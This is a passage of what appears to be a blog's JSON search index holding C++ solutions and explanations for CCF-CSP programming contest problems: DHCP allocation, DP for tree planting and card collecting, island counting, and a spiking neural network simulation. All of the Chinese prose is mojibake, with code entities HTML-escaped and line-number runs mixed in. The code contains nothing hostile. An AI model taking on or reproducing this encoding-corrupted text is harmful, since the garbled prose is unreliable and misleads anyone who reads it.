= min(n, i + r), y2 = min(n, j + r); int sum = g[x2][y2] - g[x1 - 1][y2] - g[x2][y1 - 1] + g[x1 - 1][y1 - 1]; int cnt = (x2 - x1 + 1) * (y2 - y1 + 1); if(sum \u0026lt;= cnt * t) res++; } } cout\u0026lt;\u0026lt;res; return 0; } DHCP æœåŠ¡å™¨ ç›´æ¥å¯¹ç€æè¿°ç¿»è¯‘ä¸ºä»£ç å³å¯\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 #include \u0026lt;iostream\u0026gt; #include \u0026lt;cstring\u0026gt; #include \u0026lt;algorithm\u0026gt; using namespace std; const int N = 10010; int n, m, t_def, t_max, t_min; string h; struct IP { int state; // 0ï¼šæœªåˆ†é…ï¼Œ1ï¼šå¾…åˆ†é…ï¼Œ2ï¼šå ç”¨ï¼Œ3ï¼šè¿‡æœŸ int t; // è¿‡æœŸæ—¶é—´ string owner; }ip[N]; void update_ips_state(int tc) { for (int i = 1; i \u0026lt;= n; i ++ ) if (ip[i].t \u0026amp;\u0026amp; ip[i].t \u0026lt;= tc) { if (ip[i].state == 1) { ip[i].state = 0; ip[i].owner = \u0026#34;\u0026#34;; ip[i].t = 0; } else { ip[i].state = 3; ip[i].t = 0; } } } int get_ip_by_owner(string client) { for (int i = 1; i \u0026lt;= n; i ++ ) if (ip[i].owner == client) return i; return 0; } int get_ip_by_state(int state) { for (int i = 1; i \u0026lt;= n; i ++ ) if (ip[i].state == state) return i; return 0; } int main() { cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; t_def \u0026gt;\u0026gt; t_max \u0026gt;\u0026gt; t_min \u0026gt;\u0026gt; h; cin \u0026gt;\u0026gt; m; while (m -- ) { int tc; string client, server, type; int id, te; cin \u0026gt;\u0026gt; tc \u0026gt;\u0026gt; client \u0026gt;\u0026gt; server \u0026gt;\u0026gt; type \u0026gt;\u0026gt; id \u0026gt;\u0026gt; te; if (server != h \u0026amp;\u0026amp; server != \u0026#34;*\u0026#34;) { if (type != \u0026#34;REQ\u0026#34;) continue; } if (type != \u0026#34;DIS\u0026#34; \u0026amp;\u0026amp; type != \u0026#34;REQ\u0026#34;) continue; if (server == \u0026#34;*\u0026#34; \u0026amp;\u0026amp; type != \u0026#34;DIS\u0026#34; || server == h \u0026amp;\u0026amp; type == \u0026#34;DIS\u0026#34;) continue; update_ips_state(tc); if (type == \u0026#34;DIS\u0026#34;) { int k = get_ip_by_owner(client); if (!k) k = get_ip_by_state(0); if (!k) k = get_ip_by_state(3); if (!k) continue; ip[k].state = 1, ip[k].owner = client; if (!te) ip[k].t = tc + t_def; else { int t = te - tc; t = max(t, t_min), t = min(t, t_max); ip[k].t = tc + t; } cout \u0026lt;\u0026lt; h \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; client \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; \u0026#34;OFR\u0026#34; \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; k \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; ip[k].t \u0026lt;\u0026lt; endl; } else { if (server != h) { for (int i = 1; i \u0026lt;= n; i ++ ) if (ip[i].owner == client \u0026amp;\u0026amp; ip[i].state == 1) { ip[i].state = 0; ip[i].owner = \u0026#34;\u0026#34;; ip[i].t = 0; } continue; } if (!(id \u0026gt;= 1 \u0026amp;\u0026amp; id \u0026lt;= n \u0026amp;\u0026amp; ip[id].owner == client)) cout \u0026lt;\u0026lt; h \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; client \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; \u0026#34;NAK\u0026#34; \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; id \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; 0 \u0026lt;\u0026lt; endl; else { ip[id].state = 2; if (!te) ip[id].t = tc + t_def; else { int t = te - tc; t = max(t, t_min), t = min(t, t_max); ip[id].t = tc + t; } cout \u0026lt;\u0026lt; h \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; client \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; \u0026#34;ACK\u0026#34; \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; id \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; ip[id].t \u0026lt;\u0026lt; endl; } } } return 0; } æ ¡é—¨å¤–çš„æ ‘ å‚è€ƒç¬”è®°ï¼šAcWing 3414. æ ¡é—¨å¤–çš„æ ‘ - AcWing AcWing 3414. æ ¡é—¨å¤–çš„æ ‘ - AcWing é¢˜æ„å¤§æ¦‚å°±æ˜¯å¾€ä¸åŒçš„åŒºé—´å†…æ’æ ‘ï¼Œè¦æ±‚æ˜¯è¦ä¹ˆåœ¨æ•´ä¸ªå¤§åŒºé—´æ ‘ä¹‹é—´çš„è·ç¦»æ˜¯ç­‰å·®çš„ï¼Œè¦ä¸ç„¶æ˜¯åœ¨ä¸åŒçš„å­åŒºé—´å†…æ˜¯ç­‰å·®çš„ï¼Œç„¶åéšœç¢ç‰©çš„åœ°æ–¹ä¸èƒ½æ’æ ‘ã€‚ é‚£ä¹ˆé¦–å…ˆçœ‹åˆ°è¿™ä¸ªé¢˜ï¼Œç›´è§‰ä¸Šè¿™ä¸ªé¢˜åº”è¯¥åˆ†ä¸ºä¸¤ä¸ªæ­¥éª¤ï¼Œç¬¬ä¸€è®¡ç®—æˆ‘ä»¬è¦é€‰æ‹©å“ªä¸ªåŒºé—´æ’æ ‘ï¼Œç¬¬äºŒå°±æ˜¯è®¡ç®—å½“å‰æ–¹æ¡ˆä¸‹çš„ç­‰å·®æ–¹æ¡ˆã€‚æ„Ÿè§‰ç¬¬ä¸€æ­¥æ¯”è¾ƒå…³é”®å¹¶ä¸”è´¹äº‹ï¼Œç¬¬äºŒæ­¥ä¸ç®—éš¾ï¼Œæ±‚åŒºé—´é•¿åº¦çš„çº¦æ•°å³å¯ã€‚ è¿™ç§é€‰æ‹©é—®é¢˜ä¸€èˆ¬å°±æ˜¯ DPï¼Œä¸ºå•¥å‘¢ï¼Œå½“ç¡®å®šé€‰æ‹©åŒºé—´ A åï¼Œåç»­å¯ä»¥æœ‰ä¸åŒæƒ…å†µï¼Œå½“ç»§ç»­é€‰æ‹©åŒºé—´ Aã€B ååç»­åˆæœ‰ä¸åŒæƒ…å†µï¼Œè¿™ç§æƒ…å†µçš„ç»“æ„å¾ˆåƒæ ‘ï¼Œä»ä¸€ä¸ªç»“ç‚¹å»¶ä¼¸å¾ˆå¤šç§æƒ…å†µï¼Œè¿™ç§ç”¨ DP æ¥åŠ¨æ€çš„æ¨ç»“æœï¼Œä¸€èˆ¬å¶å­ç»“ç‚¹å­˜å‚¨çš„ç»“æœå°±æ˜¯ç­”æ¡ˆã€‚ é‚£ä¹ˆé—«æ° DP åˆ†ææ³•èµ°èµ·[[é—«æ°DPåˆ†ææ³•]]\nç¡®å®šçŠ¶æ€è¡¨ç¤ºï¼Œè¿™é¢˜æˆ‘ä»¬ç”¨ä¸€ç»´ f (i) è¡¨ç¤ºï¼ˆå®é™…åˆ†æçš„æ—¶å€™ä¹Ÿæ˜¯ä»ä¸€ç»´å¼€å§‹åˆ†æï¼Œåé¢è§‰å¾—ä¸å¤Ÿï¼Œå†åŠ ç»´åº¦ï¼‰ä»¥ i ä¸ºå³ç«¯ç‚¹çš„åŒºé—´çš„æ’æ ‘æ–¹æ¡ˆï¼ˆa0~ai åŒºé—´æ‰€æœ‰æ’æ ‘æ–¹æ³•çš„é›†åˆï¼‰ çŠ¶æ€è½¬ç§»ï¼šçŠ¶æ€è½¬ç§»å°±è¦æ±‚å¦‚ä½•ä» f (0)~f (i-1) çš„å€¼æ±‚å¾— f (i) çš„å€¼ å¯¹äº f (j)ï¼Œ0\u0026lt;=j\u0026lt;=i-1 æ¥è¯´ï¼Œf (j) è¡¨ç¤ºä»¥ j ä¸ºå³ç«¯ç‚¹çš„æ–¹æ¡ˆæ•°ï¼Œé‚£ä¹ˆå¯¹äº f (i) è€Œè¨€æ–°å¢åŠ çš„æƒ…å†µå°±æ˜¯åŒºé—´ j~i çš„æ–¹æ¡ˆæ•°ï¼Œé‚£ä¹ˆéå† jï¼ŒæŠŠ f (j)*cntï¼ˆj, i) æ±‚å’Œä¾¿æ˜¯æˆ‘ä»¬çš„ç­”æ¡ˆ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; typedef long long LL; const int N = 1010, M = 100010, MOD = 1e9 + 7; int n; int a[N]; int f[N]; vector\u0026lt;int\u0026gt; q[M]; bool st[M]; int main(){ //æ‰“è¡¨ä»¥ç®—å€æ•°çš„æ–¹å¼æ¥æ±‚çº¦æ•°ï¼Œq[i]è¡¨ç¤ºiçš„çº¦æ•° for(int i = 1; i \u0026lt; M; i ++){ for(int j = i * 2; j \u0026lt; M; j += i){//å› ä¸ºé—´éš”ä¸èƒ½ç­‰äºåŒºé—´å¤§å°ï¼Œé‚£æ ·å°±ä¸èƒ½æ’æ ‘äº† q[j].push_back(i); } } cin\u0026gt;\u0026gt;n; for(int i = 0; i \u0026lt; n; i ++) cin\u0026gt;\u0026gt;a[i]; f[0] = 1; for(int i = 1; i \u0026lt; n; i++){ memset(st, 0, sizeof st); for(int j = i - 1; j \u0026gt;= 0; j --){ int d = a[i] - a[j], cnt = 0; for(int k: q[d]){ if(!st[k]){ cnt++; st[k] = true; } } st[d] = true; f[i] = (f[i] + (LL)f[j] * cnt) % MOD; } } cout\u0026lt;\u0026lt;f[n-1]; return 0; } åœ¨ y æ€»çš„ä»£ç ä¸­è¿˜æœ‰ä¸€ä¸ªå·§å¦™çš„ç‚¹åœ¨äºï¼Œå¦‚ä½•å»åˆ¤å®šæ’æ ‘çš„ä½ç½®æœ‰æ²¡æœ‰é¿å¼€éšœç¢ç‰©å‘¢ï¼Œä»£ç çš„ç¬¬ 25 è¡Œå’Œ st æ•°ç»„è§£å†³äº†è¿™ä¸ªé—®é¢˜ã€‚\nSt æ•°ç»„ç»´æŠ¤äº†ä½¿ç”¨è¿‡çš„çº¦æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå½“ä½ çš„é€‰æ‹©çš„åŒºé—´ä½¿ç”¨è¿‡æŸä¸ªé—´éš” kï¼Œé‚£ä¹ˆè¯¥é—´éš”å°±ä¸èƒ½å†ç”¨äº†ï¼Œå› ä¸ºåŒºé—´ä¸¤ä¸ªæ–­ç‚¹æ˜¯éšœç¢ç‰©ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœæ¯”å½“å‰åŒºé—´å¤§çš„åŒºé—´ä¹Ÿé€‰æ‹©äº†é—´éš” k çš„æ–¹æ¡ˆï¼Œé‚£ä¹ˆæ ‘ä¸€å®šä¼šæ’åœ¨éšœç¢ç‰©ä¸Š è¿™ä¹Ÿè§£é‡Šäº†ä¸ºå•¥å†…å±‚å¾ªç¯è¦ä»å¤§åˆ°å°éå†ï¼Œä»æœ€å°çš„åŒºé—´å¼€å§‹ä¸€ä¸ªä¸€ä¸ªæŠŠé—´éš” k ban æ‰ ","permalink":"https://juhuax.github.io/posts/study/2.%E5%88%B7%E9%A2%98/%E7%AE%97%E6%B3%95/csp/%E7%AC%AC22%E6%AC%A1ccf-csp%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%BD%AF%E4%BB%B6%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81%E9%A2%98%E8%A7%A3/","summary":"ç°åº¦ç›´æ–¹å›¾ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int N = 500; const int L = 256; int gray_L[L]; int main(){ int n, m, l, tmp; cin\u0026gt;\u0026gt;n\u0026gt;\u0026gt;m\u0026gt;\u0026gt;l; for(int i = 0; i \u0026lt; n; i ++){ for(int j = 0; j \u0026lt; m; j ++){ cin\u0026gt;\u0026gt;tmp;","title":"ç¬¬22æ¬¡CCF-CSPè®¡ç®—æœºè½¯ä»¶èƒ½åŠ›è®¤è¯é¢˜è§£"},{"content":"æ•°ç»„æ¨å¯¼ å½“ b[i] == a[i]çš„æƒ…å†µä¸‹ï¼Œæ•°ç»„ a çš„å’Œæ˜¯æœ€å¤§çš„æƒ…å†µ å½“ b[i] == b[i-1]çš„æ—¶å€™ï¼Œa[i] == 0 çš„æƒ…å†µä¸‹ï¼Œæ•°ç»„ a æœ€å° 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int N = 105; int a[N], b[N]; int n; int main(){ int sum_max = 0, sum_min = 0; cin \u0026gt;\u0026gt; n; cin \u0026gt;\u0026gt; b[0]; sum_max = b[0]; sum_min = b[0]; for(int i = 1; i \u0026lt; n; i++){ cin\u0026gt;\u0026gt; b[i]; sum_max += b[i]; if(b[i] != b[i - 1]) sum_min += b[i]; } cout \u0026lt;\u0026lt; sum_max \u0026lt;\u0026lt; endl \u0026lt;\u0026lt; sum_min; return 0; } éé›¶æ®µåˆ’åˆ† å‚è€ƒ æˆ‘ä»¬å¯ä»¥å…ˆåšä¸‹é¢è¿™ä¸ªé¢˜ï¼Œæœ¬é¢˜ç®—æ˜¯ä¸‹é¢è¿™ä¸ªé¢˜çš„ç®€åŒ–ç‰ˆæœ¬ã€‚ 2014. å²› - AcWingé¢˜åº“\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 #include\u0026lt;bits/stdc++.h\u0026gt; #define x first #define y second using namespace std; typedef pair\u0026lt;int, int\u0026gt; PII; const int N = 100005; int h[N]; PII q[N]; int main(){ int n; cin\u0026gt;\u0026gt;n; for(int i = 1; i \u0026lt;= n; i++){ cin\u0026gt;\u0026gt;h[i]; } n = unique(h + 1, h + n + 1) - h - 1; h[n + 1] = 0; for(int i = 1; i \u0026lt;= n; i++) q[i] = {h[i], i}; sort(q + 1, q + n + 1); int res =1, cnt = 1; for(int i = 1; i \u0026lt;= n; i++){ int k = q[i].y; if (h[k - 1] \u0026lt; h[k] \u0026amp;\u0026amp; h[k + 1] \u0026lt; h[k]) cnt -- ; else if (h[k - 1] \u0026gt; h[k] \u0026amp;\u0026amp; h[k + 1] \u0026gt; h[k]) cnt ++ ; if(q[i].x != q[i + 1].x) res = max(res, cnt); } cout\u0026lt;\u0026lt;res; return 0; } ä¸å²›å±¿é—®é¢˜ç±»ä¼¼ï¼Œp è¡¨ç¤ºæµ·å¹³é¢é«˜åº¦ï¼Œæ•°ç»„ a è¡¨ç¤ºå±±å³°é«˜åº¦ï¼Œéé›¶æ®µçš„æ•°é‡è¡¨ç¤ºå²›å±¿æ•°é‡ã€‚å½“æµ·å¹³é¢ p éƒ½å¤§äºå²›å±¿çš„é«˜åº¦æ—¶ï¼Œæ­¤æ—¶æµ·å¹³é¢åªæœ‰ 0 ä¸ªå²›å±¿ï¼Œå½“æµ·å¹³é¢é€æ¸ä¸‹é™ï¼Œå½“å±±å³°å‡ºç°æ—¶ï¼Œå²›å±¿æ•°++ï¼›å½“å±±è°·å‡ºç°æ—¶ï¼Œä¸¤ä¸ªå±±å³°è¢«è¿åœ¨ä¸€èµ·ï¼Œå²›å±¿æ•°\u0026ndash;ï¼›å½“å‡ºç°çš„å±±å³°å’Œç›¸é‚»å±±å³°é«˜åº¦ç›¸åŒçš„æ—¶å€™ï¼Œä¸¤ä¸ªå±±å³°è¢«è¿åœ¨ä¸€èµ·ï¼Œå²›å±¿æ•°\u0026ndash;ï¼ˆè¿™ç§æƒ…å†µå¯ä»¥å’Œå±±è°·åˆå¹¶ï¼‰ã€‚ ä»£ç æ€è·¯ï¼š\nè¯»å…¥æ•°æ® å»é‡ï¼Œåˆ é™¤ç›¸é‚»ç›¸åŒå…ƒç´ ï¼ˆunique å‡½æ•°ï¼‰ éå†æ•°ç»„ï¼ŒåŒæ—¶åšå±±å³°å’Œå±±è°·çš„åˆ¤æ–­ï¼Œå¾—åˆ°å¯¹åº”é«˜åº¦çš„å²›å±¿æ•°é‡è´¡çŒ®æ•°ç»„ éå†å²›å±¿æ•°é‡è´¡çŒ®æ•°ç»„ï¼Œå¯»æ‰¾å“ªä¸ªé«˜åº¦èƒ½å¾—åˆ°æœ€å¤šçš„å²›å±¿æ•° è¾“å‡º 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int N = 500005, M = 10005; int a[N], cnt[M]; int n; int main(){ cin\u0026gt;\u0026gt;n; for(int i = 1; i \u0026lt;= n; i++){ cin\u0026gt;\u0026gt;a[i]; } n = unique(a + 1, a + n + 1) - a - 1; a[0] = a[n + 1] = 0; for(int i = 1; i \u0026lt;= n; i++){ if(a[i - 1] \u0026lt; a[i] \u0026amp;\u0026amp; a[i + 1] \u0026lt; a[i]) cnt[a[i]]++; else if(a[i - 1] \u0026gt; a[i] \u0026amp;\u0026amp; a[i + 1] \u0026gt; a[i]) cnt[a[i]]--; } int res = 0, sum = 0; for(int i = M - 1; i; i--){ sum += cnt[i]; res = max(res, sum); } cout\u0026lt;\u0026lt;res; return 0; } è„‰å†²ç¥ç»ç½‘ç»œ [[é‚»æ¥è¡¨]] ç¬¬ 161 è¡Œçš„ mod æ“ä½œæ˜¯å¯¹å­˜å‚¨ç©ºé—´çš„ä¼˜åŒ–ï¼Œå› ä¸ºå®é™…ä¸Šåœ¨å¾ªç¯æ—¶é—´çš„æ—¶å€™æˆ‘ä»¬éœ€è¦ç”¨åˆ°çš„æˆ–è€…éœ€è¦ä¿®æ”¹çš„æ•°æ®æ˜¯å½“å‰æ—¶é—´ç‚¹å’Œè·ç¦»å½“å‰æ—¶é—´ç‚¹å»¶è¿Ÿ d åçš„æ—¶é—´ï¼Œæ‰€ä»¥å¯¹äºæ—¶é—´æˆ‘ä»¬åªéœ€è¦ç»´æŠ¤ä¸€ä¸ªé•¿åº¦ä¸º d çš„æ»šåŠ¨æ•°ç»„å³å¯ã€‚ ç¬¬ 125 è¡Œï¼Œå…³äºäºŒç»´æ•°ç»„ Iï¼Œç¬¬ä¸€ç»´åº¦æ—¶é—´ï¼Œd çš„å¤§å°ä¸è¶…è¿‡ 1000ï¼Œä½†æ˜¯å› ä¸ºä¸ºäº†ä½¿å¾—åœ°å€è¿ç»­ï¼ˆä¸€ä¸ªå°ä¼˜åŒ–ï¼‰æ‰€ä»¥å–ä¸º 1024ï¼Œç„¶åç¬¬äºŒç»´åº¦æ˜¯ç¥ç»å…ƒï¼Œå› ä¸ºåªæœ‰ç¥ç»å…ƒæ‰éœ€è¦è®°å½•ï¼Œè„‰å†²æºä¸éœ€è¦ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int N = 2010; //1000ä¸ªè„‰å†²æº+1000ä¸ªç¥ç»å…ƒ const double INF = 1e8; int n, s, p, T; double dt; //æ—¶é—´é—´éš” int h[N], e[N], D[N], ne[N],idx; // ç¥ç»å…ƒé‚»æ¥è¡¨ double W[N], v[N], u[N], a[N], b[N], c[N], d[N];//v, u, a, b, c, dæ˜¯ç¥ç»å…ƒç›¸å…³é‡ int r[N], cnt[N]; //cntå­˜å‚¨ç¥ç»å…ƒé‡Šæ”¾è„‰å†²çš„æ¬¡æ•° double I[1024][N / 2]; //è¡¨ç¤ºç¥ç»ç½‘ç»œçŠ¶æ€ï¼Œç¬¬ä¸€ç»´åº¦æ˜¯æ—¶é—´ï¼Œç¬¬äºŒç»´åº¦æ˜¯è„‰å†²æºæˆ–ç¥ç»å…ƒçš„æ ‡å·ï¼Œè¡¨ç¤ºtæ—¶é—´ä¸‹iä¸ªè„‰å†²æºï¼ˆç¥ç»å…ƒï¼‰çš„çŠ¶æ€ static unsigned long _next = 1; //æ³¨æ„è¿™é‡Œä¸ºäº†é˜²æ­¢nextå’Œå¤´æ–‡ä»¶ä¸­çš„æŸä¸ªnextå†²çªï¼Œå‰é¢åŠ ä¸ªä¸‹åˆ’çº¿ /* RAND_MAX assumed to be 32767 */ int myrand(void) { _next = _next * 1103515245 + 12345; return((unsigned)(_next/65536) % 32768); } void add(int a, int b, double c, int d){ e[idx] = b; W[idx] = c, D[idx] = d, ne[idx] = h[a], h[a] = idx++; } int main(){ memset(h, -1, sizeof h); cin\u0026gt;\u0026gt;n\u0026gt;\u0026gt;s\u0026gt;\u0026gt;p\u0026gt;\u0026gt;T; cin\u0026gt;\u0026gt;dt; for(int i = 0; i \u0026lt; n;){ int rn; cin\u0026gt;\u0026gt;rn; double vv, uu, aa, bb, cc, dd; cin\u0026gt;\u0026gt;vv\u0026gt;\u0026gt;uu\u0026gt;\u0026gt;aa\u0026gt;\u0026gt;bb\u0026gt;\u0026gt;cc\u0026gt;\u0026gt;dd; for(int j = 0; j \u0026lt;rn; j++, i++){ v[i] = vv, u[i] = uu, a[i] = aa, b[i] = bb, c[i] = cc, d[i] = dd; } } for(int i = n; i \u0026lt; n + p; i ++) cin\u0026gt;\u0026gt;r[i]; int mod = 0; while(s -- ){ int a, b, d; double c; cin\u0026gt;\u0026gt;a\u0026gt;\u0026gt;b\u0026gt;\u0026gt;c\u0026gt;\u0026gt;d; add(a, b, c, d); //æ„å»ºç¥ç»å…ƒå›¾ mod = max(mod, d + 1);//æ­¤å¤„æ˜¯å¯¹ç©ºé—´çš„ä¼˜åŒ– } for(int i = 0; i \u0026lt; T; i ++){ int t = i % mod; for(int j = n; j \u0026lt; n + p; j ++){//éå†è„‰å†²æº if(r[j] \u0026gt; myrand()){ for(int k = h[j]; ~k; k = ne[k]){ //é‡Šæ”¾è„‰å†² int x = e[k]; I[(t + D[k]) % mod][x] += W[k]; } } } for(int j = 0; j \u0026lt; n; j++){//éå†ç¥ç»å…ƒ double vv = v[j], uu = u[j]; v[j] = vv + dt * (0.04 * vv * vv + 5 * vv + 140 - uu) + I[t][j]; u[j] = uu + dt * a[j] * (b[j] * vv - uu); if(v[j] \u0026gt;= 30){ for (int k = h[j]; ~k; k = ne[k]) //é‡Šæ”¾è„‰å†² { int x = e[k]; I[(t + D[k]) % mod][x] += W[k]; } cnt[j]++; v[j] = c[j], u[j] += d[j]; } } memset(I[t], 0, sizeof I[t]); } double minv = INF, maxv = -INF; int minc = INF, maxc = -INF; for (int i = 0; i \u0026lt; n; i ++ ) { minv = min(minv, v[i]); maxv = max(maxv, v[i]); minc = min(minc, cnt[i]); maxc = max(maxc, cnt[i]); } printf(\u0026#34;%.3lf %.3lf\\n\u0026#34;, minv, maxv); printf(\u0026#34;%d %d\\n\u0026#34;, minc, maxc); return 0; } æ”¶é›†å¡ç‰Œ è¿™é“é¢˜æ˜¯æ±‚è§£æœŸæœ›ï¼Œæ‰€ä»¥ç›´æ¥ä½¿ç”¨æœŸæœ›å…¬å¼æ¦‚ç‡ x çŠ¶æ€çš„å’Œå³å¯ï¼Œé‡ç‚¹æ˜¯å¦‚ä½•æ±‚è§£çŠ¶æ€ã€‚ å› ä¸ºä¸åŒçš„çŠ¶æ€ä¹‹é—´æœ‰ä¾èµ–å…³ç³»ï¼Œå½¢æˆçš„ç»“æ„å¾ˆåƒæ˜¯æ ‘ï¼Œæ‰€ä»¥ç”¨ DP æ¥åšã€‚ æˆ‘ä»¬å°†çŠ¶æ€è¡¨ç¤ºä¸º f (i, j)ï¼Œç¬¬ä¸€ç»´åº¦ i è¡¨ç¤ºé€‰åˆ°äº†å“ªäº›ç‰Œï¼ˆç”¨ä½å‘é‡è¡¨ç¤ºï¼‰ï¼Œç¬¬äºŒä¸ªç»´åº¦è¡¨ç¤ºç¡¬å¸æ•°é‡ï¼Œf (i, j) å°±æ˜¯åœ¨ i çš„é€‰ç‰Œï¼Œæ”’äº† j ä¸ªç¡¬å¸çš„æƒ…å†µä¸‹çš„æœŸæœ›ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int N = 16, M = 1 \u0026lt;\u0026lt; N; int n, m; double p[N]; double f[M][N * 5 + 1]; //Mè¡¨ç¤ºå–ç‰Œä¸€å…±æœ‰2çš„16æ¬¡æ–¹ä¸ªæƒ…å†µï¼ŒN * 5 + 1æ„æ€æ˜¯Nä¸ªç‰Œï¼Œæ¯ä¸ªæœ€å¤š5ä¸ªç¡¬å¸ï¼Œä½†æ˜¯å®é™…ä¸Šæ”’å¤Ÿkç¡¬å¸å°±ä¼šå…‘æ¢ç‰Œï¼Œæ‰€ä»¥å…¶å®ä¼šæœ‰å†—ä½™ã€‚ double dp(int state, int coins, int r){ //æŠ½åˆ°çš„ç‰Œï¼Œç¡¬å¸æ•°ï¼Œæ²¡æŠ½åˆ°çš„ç‰Œæ•°é‡ auto\u0026amp; v = f[state][coins]; if(v \u0026gt;= 0) return v; if(coins \u0026gt;= r * m) return v = 0; v = 0; for(int i = 0; i \u0026lt; n; i++){ if(state \u0026gt;\u0026gt; i \u0026amp; 1){ v += p[i] * (dp(state, coins + 1, r) + 1); }else{ v += p[i] * ( dp((state | 1 \u0026lt;\u0026lt; i), coins, r - 1) + 1); } } return v; } int main(){ cin\u0026gt;\u0026gt;n\u0026gt;\u0026gt;m; for(int i = 0; i \u0026lt; n; i++){ cin\u0026gt;\u0026gt;p[i]; } memset(f, -1, sizeof f); printf(\u0026#34;%0.10lf\\n\u0026#34;, dp(0, 0, n)); return 0; } ","permalink":"https://juhuax.github.io/posts/study/2.%E5%88%B7%E9%A2%98/%E7%AE%97%E6%B3%95/csp/%E7%AC%AC23%E6%AC%A1ccf%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%BD%AF%E4%BB%B6%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/","summary":"æ•°ç»„æ¨å¯¼ å½“ b[i] == a[i]çš„æƒ…å†µä¸‹ï¼Œæ•°ç»„ a çš„å’Œæ˜¯æœ€å¤§çš„æƒ…å†µ å½“ b[i] == b[i-1]çš„æ—¶å€™ï¼Œa[i] == 0 çš„æƒ…å†µä¸‹ï¼Œæ•°ç»„ a æœ€å° 1 2 3 4 5 6 7 8 9 10 11 12 13 14","title":"ç¬¬23æ¬¡CCF-CSPè®¡ç®—æœºè½¯ä»¶èƒ½åŠ›è®¤è¯é¢˜è§£"},{"content":"å¦‚æ­¤ç¼–ç  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int N = 25; int n,m; int a[N],c[N],b[N]; int main(){ cin\u0026gt;\u0026gt;n\u0026gt;\u0026gt;m; for(int i = 1; i \u0026lt;= n; i++) cin\u0026gt;\u0026gt;a[i]; c[0] = 1; c[1] = a[1]; for(int i = 2 ; i \u0026lt;= n; i++) c[i] = c[i-1] * a[i]; for(int i = 1; i \u0026lt;= n; i++){ b[i] = m % a[i]; m = m / a[i]; } for(int i = 1; i \u0026lt;= n; i++) cout\u0026lt;\u0026lt;b[i]\u0026lt;\u0026lt;\u0026#34; \u0026#34;; return 0; } ä½•ä»¥åŒ…é‚® ï¼Ÿ æš´åŠ›å¾ªç¯çš„å†™æ³•ï¼Œå¯ä»¥è¿‡ 70%çš„æ•°æ®\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int N = 33; int n, x; int w[N]; int main(){ cin\u0026gt;\u0026gt;n\u0026gt;\u0026gt;x; for(int i = 0; i \u0026lt; n; i++){ cin\u0026gt;\u0026gt;w[i]; } int res = 1e8; for(int i = 0; i \u0026lt; 1\u0026lt;\u0026lt;n; i++){ int sum = 0; for(int j = 0; j \u0026lt; n; j++){ if(i \u0026gt;\u0026gt; j \u0026amp; 1){ sum += w[j]; } } if(sum \u0026gt;= x) res = min(sum, res); } cout\u0026lt;\u0026lt;res\u0026lt;\u0026lt;endl; return 0; } ç”¨ dfs æš´æœçš„æ–¹æ³•ï¼ŒåŒæ ·è¿‡ 70%çš„æ•°æ®\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int N = 33; int n, x; int w[N]; int res = 1e8; void dfs(int u, int sum){ if(u == n){ if(sum \u0026gt;= x) res = min(res, sum); }else{ dfs(u+1, sum); 